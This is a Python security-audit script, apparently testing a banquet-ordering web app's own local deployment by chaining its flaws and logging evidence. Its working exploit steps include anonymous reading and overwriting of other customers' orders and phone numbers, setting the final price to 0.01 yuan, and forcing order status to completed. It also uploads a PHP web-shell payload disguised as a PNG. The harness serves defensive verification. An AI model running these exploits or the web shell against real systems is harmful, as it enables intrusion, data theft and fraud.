"""集权层 v2：攻击链合成 —— 跨层可执行链。

低层各自证明「这一层有洞」，集成层要证明的是「这些洞串起来能干什么」。
每条链都是真实跑出来的端到端步骤序列，每步留一条可复现的证据；
链的结论按归属规则归到最低层：低层已开单的，集成层只引用并量化后果，
只有链级后果（低层看不到的那部分）才在集成层开单。

三条链共享同一套造数/清理机制：哨兵数据全部带 ai_probe_ 前缀，写完即删，零残留。
"""
from __future__ import annotations

import argparse
import datetime
import json
import os
import re
import subprocess
from typing import Any

import requests

from integration_reconcile import PFX, frontend_map, psql_rows

D = os.path.dirname(os.path.abspath(__file__))
BASE = os.environ.get("JIUYAN_BASE_URL", "http://127.0.0.1:8081")
OUT = os.path.join(D, "integration_chains.json")
OUT_REPLAY = os.path.join(D, "integration_chains_replay.json")

# 两个互不相干的连接：一个「订单主人」，一个「匿名攻击者」
owner_session = requests.Session()
attacker_session = requests.Session()


def call(session: requests.Session, method: str, path: str, body=None,
         params=None) -> tuple[int, Any]:
    kwargs: dict[str, Any] = {}
    if params:
        kwargs["params"] = params
    if body is not None:
        kwargs["data"] = json.dumps(body, ensure_ascii=False)
        kwargs["headers"] = {"Content-Type": "application/json"}
    r = session.request(method, BASE + path, timeout=20, **kwargs)
    try:
        return r.status_code, r.json()
    except ValueError:
        return r.status_code, None


def data_of(payload):
    if isinstance(payload, dict) and "data" in payload:
        return payload.get("data")
    return payload


class Chain:
    """一条攻击链：假设 + 逐步证据 + 结论。"""

    def __init__(self, cid: str, title: str, hypothesis: str,
                 severity: str, owner: str, cites: list[str]) -> None:
        self.data: dict[str, Any] = {
            "id": cid, "title": title, "hypothesis": hypothesis,
            "severity": severity, "owner": owner, "cites": cites,
            "verdict": "UNVERIFIED", "steps": [], "findings": [],
        }

    def step(self, method: str, path: str, status: Any, evidence: str) -> None:
        self.data["steps"].append({
            "n": len(self.data["steps"]) + 1,
            "method": method, "path": path, "status": status,
            "evidence": evidence,
        })

    def verdict(self, ok: bool, note: str, findings: list[dict] | None = None) -> "Chain":
        self.data["verdict"] = "CONFIRMED" if ok else "FALSIFIED"
        self.data["note"] = note
        self.data["findings"] = findings or []
        return self


def order_body(oid_tag: str, product_id: int, package_id: int,
               final_price_cent: int = 1, deposit_cent: int = 0,
               qty: int = 3) -> dict:
    """造一个可下单的订单体。成交价故意与明细合计无关，用来量化客户端控价。"""
    return {
        "customerName": PFX + oid_tag + "_cust", "customerPhone": "13800000999",
        "banquetName": PFX + oid_tag + "_banq", "banquetType": PFX + "chain_type",
        "address": PFX + oid_tag + "_addr", "reservationTime": "2027-03-05T18:30:00+08:00",
        "tableCount": 7, "packageId": package_id,
        "packageItems": [{"productId": product_id, "quantity": qty}],
        "addedItems": [], "planTotalCent": 24680, "useFinalPrice": True,
        "finalPriceCent": final_price_cent, "depositCent": deposit_cent,
        "status": "PENDING", "remark": PFX + oid_tag + "_remark",
    }


def seed_product_and_package() -> tuple[int, int]:
    """造一个商品和一个套餐，返回 (product_id, package_id)。"""
    cats = data_of(call(owner_session, "GET", "/api/categories")[1]) or []
    cid = (cats[0] or {}).get("id") if cats else None
    types = data_of(call(owner_session, "GET", "/api/package-types")[1]) or []
    type_name = (types[0] or {}).get("name") if types else None
    if cid is None or type_name is None:
        raise RuntimeError("缺少分类或套餐分类，无法造数")
    st, payload = call(owner_session, "POST", "/api/products", {
        "name": PFX + "chain_prod", "categoryId": cid, "priceCent": 5000,
        "unit": "g", "imageUrl": "/uploads/seed/products/product-01.jpg",
        "description": PFX + "chain", "isActive": True})
    if st != 200:
        raise RuntimeError(f"造商品失败 http={st}")
    pid = data_of(payload)["id"]
    st, payload = call(owner_session, "POST", "/api/packages", {
        "name": PFX + "chain_pkg", "banquetType": type_name, "priceCent": 8888,
        "imageUrl": "/uploads/seed/packages/package-01.jpg",
        "description": PFX + "chain", "isActive": True,
        "items": [{"productId": pid, "quantity": 3}]})
    if st != 200:
        raise RuntimeError(f"造套餐失败 http={st}")
    return pid, data_of(payload)["id"]


def cleanup() -> None:
    sql = f"""
    DELETE FROM orders WHERE customer_name LIKE '{PFX}%';
    DELETE FROM package_items WHERE package_id IN
        (SELECT id FROM packages WHERE name LIKE '{PFX}%');
    DELETE FROM packages WHERE name LIKE '{PFX}%';
    DELETE FROM products WHERE name LIKE '{PFX}%';
    """
    subprocess.run(["docker", "exec", "jiuyan-postgres", "psql", "-U", "jiuyan",
                    "-d", "jiuyan", "-v", "ON_ERROR_STOP=1", "-c", sql],
                   capture_output=True, text=True, timeout=60, check=True)


# --------------------------------------------------------------------------
# 链 A：零鉴权 → 跨会话越权读写 → 订单快照被重写
# --------------------------------------------------------------------------
def chain_a(pid: int, kid: int) -> Chain:
    c = Chain("CHAIN-A", "匿名会话可读可写他人订单，且写入会连带重写订单快照",
              "订单接口零鉴权，跨连接读写成功；写入路径会重建快照",
              "CRITICAL", "service（引用 NO_AUTHZ，链级后果归集成层）",
              ["NO_AUTHZ", "FN-SNAPSHOT-SEMANTICS"])
    body = order_body("cha", pid, kid, final_price_cent=13579, deposit_cent=1111)
    st, payload = call(owner_session, "POST", "/api/orders", body)
    oid = data_of(payload)["id"]
    c.step("POST", "/api/orders", st, f"订单主人创建订单 id={oid}（请求里没有任何凭证头）")

    st, payload = call(attacker_session, "GET", f"/api/orders/{oid}")
    row = data_of(payload) or {}
    pii = [k for k in ("customerName", "customerPhone", "address", "remark") if row.get(k)]
    c.step("GET", f"/api/orders/{oid}", st,
           f"全新连接（无 Cookie / Token）读到 {len(pii)} 个 PII 字段：{pii}")
    masked = re.sub(r"(\d{3})\d{4}(\d{4})", r"\1****\2", str(row.get("customerPhone") or ""))
    c.step("前端", "App.jsx 订单详情抽屉", None,
           f"接口返回手机号明文 {row.get('customerPhone')}，前端渲染时才脱敏成 {masked}"
           f" —— 脱敏只发生在展示层，接口与库里都是明文")

    st, payload = call(attacker_session, "PATCH", f"/api/orders/{oid}/status", {"status": "DEPOSIT_PAID"})
    c.step("PATCH", f"/api/orders/{oid}/status", st,
           f"匿名改状态 → {data_of(payload).get('status') if st == 200 else payload}")

    mutated = dict(body)
    mutated["customerPhone"] = "13900000000"
    mutated["packageItems"] = [{"productId": pid, "quantity": 99}]
    st, payload = call(attacker_session, "PUT", f"/api/orders/{oid}", mutated)
    c.step("PUT", f"/api/orders/{oid}", st, "匿名全量覆盖订单：改电话 + 把明细数量改成 99")

    rows = psql_rows(f"SELECT customer_phone, status, package_snapshot FROM orders WHERE id={oid}")
    db = rows[0] if rows else {}
    snap = db.get("package_snapshot") or {}
    qty = (snap.get("items") or [{}])[0].get("quantity")
    c.step("DB", f"SELECT ... WHERE id={oid}", 200,
           f"库里的快照已被重写：明细数量={qty}，电话={db.get('customer_phone')}，"
           f"状态={db.get('status')}")

    ok = st == 200 and qty == 99 and db.get("customer_phone") == "13900000000"
    return c.verdict(ok, "匿名会话完成了读 / 改状态 / 全量覆盖，且覆盖动作重写了订单快照", [{
        "id": "INT-ANON-WRITE-REWRITES-SNAPSHOT",
        "severity": "CRITICAL",
        "title": "匿名写入会连带重写订单快照：订单历史快照失去证据效力",
        "detail": "PUT 走 apply() → buildPackageSnapshot()，匿名会话改明细后，"
                  "订单快照被整体重建，原来记下的套餐明细不再可信。",
        "repro": "python3 integration_chain.py --chain CHAIN-A",
        "evidence": f"库内快照明细数量={qty}，电话={db.get('customer_phone')}",
        "owner": "集成层（链级后果；越权本身归服务层 NO_AUTHZ）",
    }, {
        "id": "INT-PII-MASKED-ONLY-IN-FRONTEND",
        "severity": "HIGH",
        "title": "手机号脱敏只做在渲染层：接口与库里都是明文，匿名可批量拉取",
        "detail": "订单详情抽屉把手机号显示成 138****9999，说明产品侧认定它是敏感字段；"
                  "但 API 原样返回明文，库里也是明文。配合零鉴权，任何人可分页拉全量手机号。",
        "repro": "python3 integration_chain.py --chain CHAIN-A",
        "evidence": f"接口返回 customerPhone={row.get('customerPhone')}，前端渲染脱敏为 {masked}",
        "owner": "集成层（链级后果；零鉴权归服务层 NO_AUTHZ）",
    }])


# --------------------------------------------------------------------------
# 链 B：上传任意字节 → 公开静态映射 → 匿名下载原字节
# --------------------------------------------------------------------------
def chain_b() -> Chain:
    c = Chain("CHAIN-B", "任意字节以图片名落盘，且落盘后匿名可原样下载",
              "上传只信客户端声明的内容类型，静态映射又对所有人开放",
              "CRITICAL", "service（引用 FN-UPLOAD-NO-CONTENT-SNIFF，链级后果归集成层）",
              ["FN-UPLOAD-NO-CONTENT-SNIFF", "FILE-STATIC-ROOT-NO-TRAILING-SLASH"])
    payload = b"<?php system($_GET['c']); ?>\n-- not an image at all --\n"
    resp = owner_session.post(
        BASE + "/api/uploads/product-image",
        files={"file": ("probe.png", payload, "image/png")}, timeout=30)
    st = resp.status_code
    try:
        url = (resp.json().get("data") or {}).get("imageUrl")
    except ValueError:
        url = None
    c.step("POST", "/api/uploads/product-image", st,
           f"上传非图片字节 {len(payload)} 字节，自报 image/png、文件名 probe.png → imageUrl={url}")

    r = attacker_session.get(BASE + url, timeout=20) if url else None
    body = r.content if r is not None else b""
    c.step("GET", url or "-", r.status_code if r is not None else "-",
           f"匿名连接（无凭证）下载 → {r.status_code if r is not None else '-'}，"
           f"字节完全一致={body == payload}，Content-Type="
           f"{(r.headers.get('Content-Type') if r is not None else '-')}")

    on_disk = subprocess.run(
        ["docker", "exec", "jiuyan-backend", "ls", "-l", "/app" + (url or "")],
        capture_output=True, text=True)
    c.step("FS", "/app" + (url or ""), 200 if on_disk.returncode == 0 else 1,
           on_disk.stdout.strip() or on_disk.stderr.strip()[:200])

    ok = bool(url) and r is not None and r.status_code == 200 and body == payload
    return c.verdict(ok, "非图片字节以 .png 落盘，并可被匿名无凭证原样下载", [{
        "id": "INT-UPLOAD-ANONYMOUS-READBACK",
        "severity": "CRITICAL",
        "title": "上传内容匿名可读回：落盘字节与上传字节逐字节一致",
        "detail": "上传接口不校验内容（只信客户端声明），写盘路径又在 /uploads/** 公开映射下，"
                  "任何人都能把任意字节放进站点并当作静态资源取回。",
        "repro": "python3 integration_chain.py --chain CHAIN-B",
        "evidence": f"下载字节与上传字节一致={ok}，Content-Type 由服务端按扩展名给出",
        "owner": "集成层（链级后果；内容不嗅探归函数层 FN-UPLOAD-NO-CONTENT-SNIFF）",
    }])


# --------------------------------------------------------------------------
# 链 C：客户端控价 → DB / API / 前端视图模型三方同时矛盾
# --------------------------------------------------------------------------
def chain_c(pid: int, kid: int) -> Chain:
    c = Chain("CHAIN-C", "成交价由客户端说了算：DB、API、前端视图模型同时认下同一个假数字",
              "finalPriceCent 无上界，与套餐价、明细合计没有任何算术关系",
              "CRITICAL", "function（引用 FN-PRICE-CLIENT-CONTROLLED）",
              ["FN-PRICE-CLIENT-CONTROLLED", "CLASS-RULE-MISSING-IN-ALL-LAYERS"])
    body = order_body("chc", pid, kid, final_price_cent=1, deposit_cent=0, qty=3)
    st, payload = call(owner_session, "POST", "/api/orders", body)
    oid = data_of(payload)["id"]
    c.step("POST", "/api/orders", st,
           f"下单时 finalPriceCent=1（1 分），明细 3 件 × 5000 分 = 15000 分")

    rows = psql_rows(f"SELECT final_price_cent, plan_total_cent FROM orders WHERE id={oid}")
    db = rows[0] if rows else {}
    c.step("DB", f"SELECT final_price_cent FROM orders WHERE id={oid}", 200,
           f"库里的成交价 = {db.get('final_price_cent')} 分")

    api_body = data_of(call(owner_session, "GET", f"/api/orders/{oid}")[1]) or {}
    c.step("GET", f"/api/orders/{oid}", 200,
           f"API 回读成交价 = {api_body.get('finalPriceCent')} 分")

    view = frontend_map({"order": api_body}).get("order") or {}
    implied = sum(round(x["price"] * x["qty"] * 100)
                  for x in (view.get("packageItems") or []) + (view.get("extras") or []))
    c.step("前端", "mapOrder（前端真实 mapper）", 200,
           f"前端渲染订单金额 = {view.get('amount')} 元；"
           f"它自己看到的明细合计 = {implied / 100} 元")

    ok = db.get("final_price_cent") == 1 and view.get("amount") == 0.01 and implied == 15000
    return c.verdict(ok,
                     f"成交价 0.01 元被三方一致接受，而明细合计是 {implied / 100} 元，"
                     f"差 {implied - 1} 分（{implied / 100} 元）；服务端没有任何一处核对", None)


# --------------------------------------------------------------------------
# 链 D：匿名改明细 → 同一订单里三个价格并存，前端只展示其中两个
# --------------------------------------------------------------------------
def chain_d(pid: int, kid: int) -> Chain:
    c = Chain("CHAIN-D", "明细被改成 99 件后，订单里同时存在三个互不相等的价格，而明细合计从不显示",
              "明细数量与成交价、套餐价三者无约束，且订单详情不展示明细合计",
              "HIGH", "integration（链级后果；明细归属归函数层，快照语义归函数层）",
              ["FN-SNAPSHOT-SEMANTICS", "CLASS-RULE-MISSING-IN-ALL-LAYERS",
               "PACKAGE_QUANTITY_NOT_VALIDATED"])
    body = order_body("chd", pid, kid, final_price_cent=1, deposit_cent=0, qty=3)
    st, payload = call(owner_session, "POST", "/api/orders", body)
    oid = data_of(payload)["id"]

    mutated = dict(body)
    mutated["packageItems"] = [{"productId": pid, "quantity": 99}]
    st, _ = call(attacker_session, "PUT", f"/api/orders/{oid}", mutated)
    c.step("PUT", f"/api/orders/{oid}", st, "匿名把明细数量改成 99，成交价保持 1 分")

    api_body = data_of(call(attacker_session, "GET", f"/api/orders/{oid}")[1]) or {}
    view = frontend_map({"order": api_body}).get("order") or {}
    implied = sum(round(x["price"] * x["qty"] * 100)
                  for x in (view.get("packageItems") or []) + (view.get("extras") or []))
    pkg = data_of(call(owner_session, "GET", f"/api/packages/{kid}")[1]) or {}
    pkg_view = frontend_map({"package": pkg}).get("package") or {}
    c.step("GET", f"/api/orders/{oid}", 200,
           f"订单金额 {view.get('amount')} 元 / 明细合计 {implied / 100} 元 / "
           f"套餐标价 {pkg_view.get('price')} 元 —— 三个数字互不相等")
    c.step("前端", "App.jsx 订单详情抽屉", None,
           "抽屉只渲染 已选套餐 / 加购商品 / 订单金额 / 定金，明细单价与明细合计一律不渲染，"
           "员工在界面上无法核对订单金额的构成")

    ok = implied == 495000 and view.get("amount") == 0.01
    return c.verdict(ok,
                     "订单金额 0.01 元、明细合计 4950.00 元、套餐标价 88.88 元三者并存，"
                     "而界面不展示明细合计 —— 客户端控价的后果在业务侧不可见", [{
        "id": "INT-THREE-PRICES-NO-DETAIL-TOTAL",
        "severity": "HIGH",
        "title": "同一订单并存三个互不相等的价格，界面只展示其中两个，明细合计从不显示",
        "detail": "客户端可把成交价改成 0.01 元，同时把明细数量改成 99；订单详情抽屉渲染了"
                  "订单金额和套餐名，却没有渲染明细合计，业务侧没有任何一处能看出这两个数字对不上。",
        "repro": "python3 integration_chain.py --chain CHAIN-D",
        "evidence": f"订单金额 {view.get('amount')} 元 vs 明细合计 {implied / 100} 元 vs "
                    f"套餐标价 {pkg_view.get('price')} 元",
        "owner": "集成层（链级后果；控价根因归函数层 FN-PRICE-CLIENT-CONTROLLED）",
    }])


# --------------------------------------------------------------------------
# 链 E：状态跃迁 → 一张 0 元定金、0.01 元金额的「已完成」订单
# --------------------------------------------------------------------------
def chain_e(pid: int, kid: int) -> Chain:
    c = Chain("CHAIN-E", "订单可以被直接推进到「已完成」，定金 0 元、金额 0.01 元",
              "状态机没有任何约束，PENDING 可一步跳到 COMPLETED",
              "HIGH", "class（引用 NO_STATE_MACHINE）",
              ["NO_STATE_MACHINE", "CLASS-RULE-MISSING-IN-ALL-LAYERS"])
    body = order_body("che", pid, kid, final_price_cent=1, deposit_cent=0, qty=3)
    st, payload = call(owner_session, "POST", "/api/orders", body)
    oid = data_of(payload)["id"]
    c.step("POST", "/api/orders", st, f"建单 id={oid}：PENDING、定金 0、成交价 1 分")

    st, payload = call(attacker_session, "PATCH", f"/api/orders/{oid}/status",
                       {"status": "COMPLETED"})
    api_body = data_of(call(attacker_session, "GET", f"/api/orders/{oid}")[1]) or {}
    view = frontend_map({"order": api_body}).get("order") or {}
    c.step("PATCH", f"/api/orders/{oid}/status", st,
           f"匿名 PENDING → COMPLETED 一次成功；前端渲染状态 = {view.get('status')}，"
           f"定金 = {view.get('deposit')} 元，订单金额 = {view.get('amount')} 元")

    rows = psql_rows(f"SELECT status, deposit_cent, final_price_cent FROM orders WHERE id={oid}")
    db = rows[0] if rows else {}
    c.step("DB", f"SELECT status, deposit_cent FROM orders WHERE id={oid}", 200,
           f"库里的状态 = {db.get('status')}，定金 = {db.get('deposit_cent')} 分")

    ok = db.get("status") == "COMPLETED" and view.get("status") == "已完成"
    return c.verdict(ok,
                     "0 元定金、0.01 元金额的订单被推成「已完成」，业务侧看到的是一张已交付订单",
                     None)


# --------------------------------------------------------------------------
# 入口
# --------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(description="集权层：攻击链合成")
    parser.add_argument("--chain", action="append", default=[], metavar="CHAIN_ID",
                        help="只跑指定攻击链 id，可重复（如 CHAIN-A）")
    args = parser.parse_args()
    known = {"CHAIN-A", "CHAIN-B", "CHAIN-C", "CHAIN-D", "CHAIN-E"}
    unknown = sorted(set(args.chain) - known)
    if unknown:
        raise SystemExit(f"未知攻击链 id: {unknown}；可用: {sorted(known)}")
    wanted = set(args.chain)

    chains: list[Chain] = []
    try:
        pid, kid = seed_product_and_package()
        builders = [
            ("CHAIN-A", lambda: chain_a(pid, kid)),
            ("CHAIN-B", chain_b),
            ("CHAIN-C", lambda: chain_c(pid, kid)),
            ("CHAIN-D", lambda: chain_d(pid, kid)),
            ("CHAIN-E", lambda: chain_e(pid, kid)),
        ]
        for cid, build in builders:
            if not wanted or cid in wanted:
                chains.append(build())
    finally:
        cleanup()

    data = [c.data for c in chains]
    confirmed = sum(1 for d in data if d["verdict"] == "CONFIRMED")
    res = {
        "generated_at": datetime.datetime.now().isoformat(),
        "base_url": BASE,
        "chains": data,
        "summary": {"total": len(data), "confirmed": confirmed,
                    "new_findings": sum(len(d.get("findings") or []) for d in data)},
    }
    # 单链重放不覆盖全量产物
    out = OUT_REPLAY if args.chain else OUT
    json.dump(res, open(out, "w", encoding="utf-8"), ensure_ascii=False, indent=2)

    print(f"攻击链 -> {out}")
    for d in data:
        print(f"  {d['id']} [{d['verdict']}] {d['title']}")
        for st in d["steps"]:
            print(f"      {st['n']}. {st['method']:6} {st['path']} -> {st['status']}")
        print(f"      结论: {d.get('note')}")


if __name__ == "__main__":
    main()
